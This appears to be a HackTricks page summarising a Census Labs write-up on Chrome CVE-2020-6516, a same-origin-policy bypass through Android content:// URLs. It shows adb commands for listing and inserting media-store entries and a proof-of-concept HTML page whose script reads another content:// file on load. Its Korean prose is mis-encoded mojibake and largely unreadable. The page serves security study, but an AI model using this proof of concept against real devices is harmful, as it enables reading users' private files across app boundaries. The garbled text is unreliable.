<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.**

</details>


**ì´ê²ƒì€ [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)ì˜ ê²Œì‹œë¬¼ ìš”ì•½ì…ë‹ˆë‹¤.**

### ë¯¸ë””ì–´ ìŠ¤í† ì–´ì—ì„œ íŒŒì¼ ëª©ë¡ ë‚˜ì—´í•˜ê¸°
ë¯¸ë””ì–´ ìŠ¤í† ì–´ì—ì„œ ê´€ë¦¬ë˜ëŠ” íŒŒì¼ì„ ë‚˜ì—´í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
$ content query --uri content://media/external/file
```
ì¸ë±ì‹±ëœ ê° íŒŒì¼ì˜ ì‹ë³„ìì™€ ê²½ë¡œë§Œ í‘œì‹œí•˜ì—¬ ë” ì‚¬ìš©ì ì¹œí™”ì ì¸ ì¶œë ¥ì„ ìœ„í•´:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
ì½˜í…ì¸  ì œê³µìëŠ” ìì²´ ê°œì¸ì ì¸ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ê²©ë¦¬ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì œê³µìì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ëŠ” íŠ¹ì •í•œ `content://` URIë¥¼ í•„ìš”ë¡œ í•©ë‹ˆë‹¤. ì œê³µìì— ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•œ ê²½ë¡œ ì •ë³´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ ë§¤ë‹ˆí˜ìŠ¤íŠ¸ë‚˜ Android í”„ë ˆì„ì›Œí¬ì˜ ì†ŒìŠ¤ ì½”ë“œì—ì„œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Chromeì˜ ì½˜í…ì¸  ì œê³µì ì•¡ì„¸ìŠ¤
Androidì—ì„œ Chromeì€ `content://` ìŠ¤í‚´ì„ í†µí•´ ì½˜í…ì¸  ì œê³µìì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ ì œ3ì ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ë‚´ë³´ë‚¸ ì‚¬ì§„ì´ë‚˜ ë¬¸ì„œì™€ ê°™ì€ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì„¤ëª…í•˜ê¸° ìœ„í•´ íŒŒì¼ì„ ë¯¸ë””ì–´ ìŠ¤í† ì–´ì— ì‚½ì…í•œ ë‹¤ìŒ Chromeì„ í†µí•´ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

ë¯¸ë””ì–´ ìŠ¤í† ì–´ì— ì‚¬ìš©ì ì •ì˜ í•­ëª© ì‚½ì…:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
ìƒˆë¡œ ì‚½ì…ëœ íŒŒì¼ì˜ ì‹ë³„ìë¥¼ í™•ì¸í•˜ì„¸ìš”:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
íŒŒì¼ì€ íŒŒì¼ì˜ ì‹ë³„ìë¥¼ ì‚¬ìš©í•˜ì—¬ êµ¬ì„±ëœ URLì„ ì‚¬ìš©í•˜ì—¬ Chromeì—ì„œ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, íŠ¹ì • ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ê´€ë ¨ëœ íŒŒì¼ì„ ë‚˜ì—´í•˜ë ¤ë©´:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy ìš°íšŒ

_Same Origin Policy_ (SOP)ëŠ” ë¸Œë¼ìš°ì €ì—ì„œ ì›¹ í˜ì´ì§€ê°€ ë‹¤ë¥¸ ì¶œì²˜ì˜ ë¦¬ì†ŒìŠ¤ì™€ ìƒí˜¸ ì‘ìš©í•˜ëŠ” ê²ƒì„ ì œí•œí•˜ëŠ” ë³´ì•ˆ í”„ë¡œí† ì½œì…ë‹ˆë‹¤. ì´ëŠ” ëª…ì‹œì ìœ¼ë¡œ Cross-Origin-Resource-Sharing (CORS) ì •ì±…ì— ì˜í•´ í—ˆìš©ë˜ì§€ ì•ŠëŠ” í•œ ì •ë³´ ëˆ„ì¶œê³¼ ì‚¬ì´íŠ¸ ê°„ ìš”ì²­ ìœ„ì¡°ë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•œ ê²ƒì…ë‹ˆë‹¤. Chromeì€ `content://`ì„ ë¡œì»¬ ìŠ¤í‚´ìœ¼ë¡œ ê°„ì£¼í•˜ì—¬ ë” ì—„ê²©í•œ SOP ê·œì¹™ì„ ì ìš©í•˜ë©°, ê° ë¡œì»¬ ìŠ¤í‚´ URLì€ ë³„ë„ì˜ ì¶œì²˜ë¡œ ì²˜ë¦¬ë©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ CVE-2020-6516ì€ Chromeì—ì„œ `content://` URLì„ í†µí•´ ë¡œë“œëœ ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ SOP ê·œì¹™ ìš°íšŒë¥¼ í—ˆìš©í•˜ëŠ” ì·¨ì•½ì ì´ì—ˆìŠµë‹ˆë‹¤. ì‹¤ì œë¡œ `content://` URLì—ì„œ ë¡œë“œëœ JavaScript ì½”ë“œëŠ” SOP ê·œì¹™ì„ ìš°íšŒí•˜ì—¬ ë‹¤ë¥¸ `content://` URLì„ í†µí•´ ë¡œë“œëœ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì—ˆìœ¼ë©°, íŠ¹íˆ Android 10 ì´ì „ ë²„ì „ì—ì„œ ìŠ¤ì½”í”„ ì €ì¥ì†Œê°€ êµ¬í˜„ë˜ì§€ ì•Šì€ Android ê¸°ê¸°ì—ì„œëŠ” ì´ëŸ¬í•œ ë³´ì•ˆ ë¬¸ì œê°€ ì‹¬ê°í•œ ìš°ë ¤ì˜€ìŠµë‹ˆë‹¤.

ì•„ë˜ì˜ ì¦ëª… ì½”ë“œëŠ” ì´ ì·¨ì•½ì ì„ ë³´ì—¬ì£¼ëŠ” ê²ƒìœ¼ë¡œ, HTML ë¬¸ì„œëŠ” **/sdcard**ì— ì—…ë¡œë“œëœ í›„ ë¯¸ë””ì–´ ìŠ¤í† ì–´ì— ì¶”ê°€ë˜ë©°, JavaScriptì—ì„œ `XMLHttpRequest`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¯¸ë””ì–´ ìŠ¤í† ì–´ì˜ ë‹¤ë¥¸ íŒŒì¼ì˜ ë‚´ìš©ì„ ì•¡ì„¸ìŠ¤í•˜ê³  í‘œì‹œí•˜ì—¬ SOP ê·œì¹™ì„ ìš°íšŒí•©ë‹ˆë‹¤.

ì¦ëª… ì½”ë“œ HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
